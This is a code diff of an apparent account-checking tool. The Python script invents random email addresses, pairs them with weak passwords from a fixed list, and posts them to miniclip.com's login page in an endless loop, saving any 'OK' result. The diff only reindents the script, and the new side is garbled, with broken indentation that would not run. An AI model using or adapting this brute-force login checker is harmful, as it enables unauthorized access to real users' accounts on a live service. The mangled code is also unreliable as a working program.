@@ -8,39 +8,39 @@ passwords = ["ahaaha", "kurda", "samisami", "1122334455", "1234512345", "112233"
 def generate_email():
     username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
     domain = random.choice(domains)
-    return f"{username}@{domain}"
-
-def generate_password():
-    return random.choice(passwords)
-
-def check_account(email, password):
-    url = "https://miniclip.com/login"
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/x-www-form-urlencoded"
-    }
-    payload = {
-        "email": email,
-        "password": password
-    }
+return f"{username}@{domain}"
     
-    response = requests.post(url, headers=headers, data=payload)
-    if response.status_code == 200:
-        return "OK"
-    else:
-        return "BAD"
-
-def main():
-    while True:
-        email = generate_email()
-        password = generate_password()
-        result = check_account(email, password)
+    def generate_password():
+    return random.choice(passwords)
         
-        if result == "OK":
-                file.write(f"Email: {email}, Password: {password} - {result}\n")
-            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "green"))
-        else:
-            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "red"))
-
-if __name__ == "__main__":
-    main()
+        def check_account(email, password):
+            url = "https://miniclip.com/login"
+            headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+            }
+            payload = {
+            "email": email,
+            "password": password
+            }
+            
+            response = requests.post(url, headers=headers, data=payload)
+            if response.status_code == 200:
+            return "OK"
+                else:
+                return "BAD"
+                    
+                    def main():
+                        while True:
+                            email = generate_email()
+                            password = generate_password()
+                            result = check_account(email, password)
+                            
+                            if result == "OK":
+                                file.write(f"Email: {email}, Password: {password} - {result}\n")
+                                print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "green"))
+                                else:
+                                    print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "red"))
+                                    
+                                    if __name__ == "__main__":
+                                        main()
